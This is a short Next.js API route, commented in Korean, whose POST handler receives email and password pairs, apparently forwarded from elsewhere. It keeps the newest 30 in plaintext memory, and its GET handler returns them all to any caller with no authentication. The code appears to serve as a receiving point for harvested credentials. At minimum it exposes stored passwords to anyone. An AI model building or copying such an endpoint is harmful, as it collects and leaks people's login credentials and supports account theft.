// app/api/forwarded/route.ts
import {NextRequest, NextResponse} from 'next/server';

const latestStack: {email: string; password: string}[] = [];

setInterval(() => {
  latestStack.length = 0; // 배열 비우기
  console.log('[INFO] latestStack 초기화됨');
}, 1 * 60 * 1000);

export async function POST(req: NextRequest) {
  const body = await req.json();
  const newEntry = body;

  if (newEntry?.email && newEntry?.password) {
    // 맨 뒤에 push → 최신 정보가 마지막에 위치
    latestStack.push({email: newEntry.email, password: newEntry.password});

    // 30개까지만 유지
    if (latestStack.length > 30) {
      latestStack.shift();  // 가장 오래된 값 제거 (FIFO)
    }
  }

  return NextResponse.json({status: 'ok'});
}

export async function GET() {
  return NextResponse.json(latestStack);
}
